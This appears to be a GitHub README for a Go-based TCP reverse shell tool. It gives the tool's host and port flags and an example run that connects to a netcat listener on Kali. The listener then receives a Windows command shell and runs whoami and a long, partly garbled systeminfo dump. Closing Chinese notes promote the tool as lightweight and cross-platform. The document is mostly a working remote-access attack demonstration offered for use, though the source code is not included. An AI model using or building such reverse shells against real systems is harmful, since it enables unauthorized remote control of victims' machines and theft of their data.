#### Golang Tcp Reverse Shell

``` bash
------------------------------------------------
A golang based reverse shell
------------------------------------------------
 ____          _               _  __           _ _
| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |
|  _ \| | | | | |  | | | |/ __| | |_ / _ \ '__| | |
| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |
|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|
       |___/
My QQ:1185151867
Blog: https://fdlucifer.github.io/
################################################
```

## Usage

``` bash
Usage of goreverseshell.exe:
  -host string
        the host to connect (default "input host here")
  -port int
        nc listenling port (default 5566)
```

#### Example

``` bash
D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell>goreverseshell.exe -host 192.168.66.6 -port 5566
------------------------------------------------
A golang based reverse shell
------------------------------------------------
 ____          _               _  __           _ _
| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |
|  _ \| | | | | |  | | | |/ __| | |_ / _ \ '__| | |
| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |
|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|
       |___/
My QQ:1185151867
Blog: https://fdlucifer.github.io/
################################################
*ip:192.168.66.6------port:&d
%!(EXTRA int=5566)
```

 - ![](/showpics/exam1.jpg)

``` bash
root@kali:~# nc -lvp 5566
listening on [any] 5566 ...
192.168.66.1: inverse host lookup failed: Unknown host
connect to [192.168.66.6] from (UNKNOWN) [192.168.66.1] 21322
Microsoft Windows [�汾 10.0.18363.752]
(c) 2019 Microsoft Corporation����������Ȩ����

D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell>whoami
whoami
lucifer11\hasee

D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell>systeminfo
systeminfo

������:           LUCIFER11
OS ����:          Microsoft Windows 10 ��ҵ��
OS �汾:          10.0.18363 ��ȱ Build 18363
OS ������:        Microsoft Corporation
OS ����:          ��������վ
OS ��������:      Multiprocessor Free
ע����������:     HASEE
ע������:       
��Ʒ ID:          00328-90000-00000-AAOEM
��ʼ��װ����:     2019/9/23, 18:08:18
ϵͳ����ʱ��:     2020/4/8, 15:28:33
ϵͳ������:       HASEE Computer
ϵͳ�ͺ�:         PA70ES                         
ϵͳ����:         x64-based PC
������:           ��װ�� 1 ����������
                  [01]: Intel64 Family 6 Model 158 Stepping 10 GenuineIntel ~2201 Mhz
BIOS �汾:        American Megatrends Inc. 1.07.10RHS4, 2018/11/14
Windows Ŀ¼:     C:\WINDOWS
ϵͳĿ¼:         C:\WINDOWS\system32
�����豸:         \Device\HarddiskVolume4
ϵͳ��������:     zh-cn;����(�й�)
���뷨��������:   zh-cn;����(�й�)
ʱ��:             (UTC+08:00) ���������죬�����ر�����������³ľ��
�����ڴ�����:     16,231 MB
���õ������ڴ�:   6,104 MB
�����ڴ�: ����: 19,303 MB
�����ڴ�: ����:   4,390 MB
�����ڴ�: ʹ����: 14,913 MB
ҳ���ļ�λ��:     C:\pagefile.sys
��:               WORKGROUP
��¼������:       \\LUCIFER11
�޲�����:         ��װ�� 14 ���޲�������
                  [01]: KB4537572
                  [02]: KB4515383
                  [03]: KB4516115
                  [04]: KB4517245
                  [05]: KB4520390
                  [06]: KB4521863
                  [07]: KB4524244
                  [08]: KB4524569
                  [09]: KB4525419
                  [10]: KB4528759
                  [11]: KB4537759
                  [12]: KB4538674
                  [13]: KB4541338
                  [14]: KB4541335
����:             ��װ�� 8 �� NIC��
                  [01]: VMware Virtual Ethernet Adapter for VMnet1
                      ������:      VMware Network Adapter VMnet1
                      ���� DHCP:   ��
                      DHCP ������: 192.168.233.254
                      IP ��
                        [01]: 192.168.233.1
                        [02]: fe80::9180:197a:ce35:69b8
                  [02]: VMware Virtual Ethernet Adapter for VMnet8
                      ������:      VMware Network Adapter VMnet8
                      ���� DHCP:   ��
                      IP ��
                        [01]: 192.168.66.1
                        [02]: fe80::9d24:3f2d:1f79:94eb
                  [03]: Intel(R) Wireless-AC 9462
                      ������:      WLAN 2
                      ״:        ý���������ж�
                  [04]: Realtek PCIe GbE Family Controller
                      ������:      ����
                      ���� DHCP:   ��
                      IP ��
                        [01]: 192.168.1.56
                        [02]: fe80::b11f:6ef2:7ec6:6eb3
                  [05]: Bluetooth Device (Personal Area Network)
                      ������:      ������������
                      ״:        ý���������ж�
                  [06]: Microsoft KM-TEST Loopback Adapter
                      ������:      Npcap Loopback Adapter
                      ���� DHCP:   ��
                      DHCP ������: 255.255.255.255
                      IP ��
                        [01]: 169.254.234.82
                        [02]: fe80::40e5:86bd:7eba:ea52
                  [07]: VirtualBox Host-Only Ethernet Adapter
                      ������:      VirtualBox Host-Only Network
                      ���� DHCP:   ��
                      IP ��
                        [01]: 192.168.56.1
                        [02]: fe80::9429:8e07:8ee2:d61d
                  [08]: TAP-Windows Adapter V9
                      ������:      ��������
                      ״:        ý���������ж�
Hyper-V Ҫ��:     ������������ģʽ��չ: ��
                  �������������⻯: ��
                  ������ת��: ��
                  �����б�������: ��

D:\Go\testgofiles\oldboygo\goprogram\hackingwithgolang\goreverseshell>
```

 - ![](/showpics/exam2.jpg)


### 优点特色

 - 轻量级的golang tcp reverse shell
 - 支持反弹windows和linux的shell
 - 能多平台交叉编译使用

### 注意
 - 如果工具打开报错请把flag.txt和go build生成的goreverseshell.exe放在同一目录下即可
 - 有任何问题请联系qq:1185151867 :)

:) enjoy it ! :)